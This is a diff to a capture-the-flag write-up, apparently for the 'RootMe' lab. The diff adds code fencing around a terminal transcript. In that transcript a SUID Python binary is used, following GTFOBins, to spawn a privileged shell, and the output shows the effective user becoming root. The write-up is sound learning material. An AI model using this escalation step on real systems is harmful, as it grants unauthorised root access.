@@ -263,6 +263,7 @@ We can consult [GTFOBins](https://gtfobins.github.io/gtfobins/python/) for what 
 So if we run the command below as suggested we should get root.
 
 **Using Python to get root**
+```console
 www-data@rootme:/tmp$ cd /usr/bin
 cd /usr/bin
 www-data@rootme:/usr/bin$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
@@ -271,6 +272,7 @@ whoami
 root
 id
 uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+```
 
 ## Conclusion
 ---
